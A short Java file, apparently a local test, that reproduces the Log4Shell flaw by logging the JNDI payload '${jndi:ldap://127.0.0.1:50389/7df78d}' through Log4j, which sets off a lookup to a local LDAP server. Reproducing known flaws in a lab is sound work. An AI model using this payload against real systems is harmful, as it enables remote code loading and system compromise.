package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class tmp {
    private static final Logger logger = LogManager.getLogger(tmp.class);

    public static void main(String[] args) throws NamingException {
//        String url = "ldap://127.0.0.1:50389/7df78d";
//        InitialContext initialContext = new InitialContext();
//        initialContext.lookup(url);

        String message = "${jndi:ldap://127.0.0.1:50389/7df78d}";

        logger.error("{}", message);
    }
}
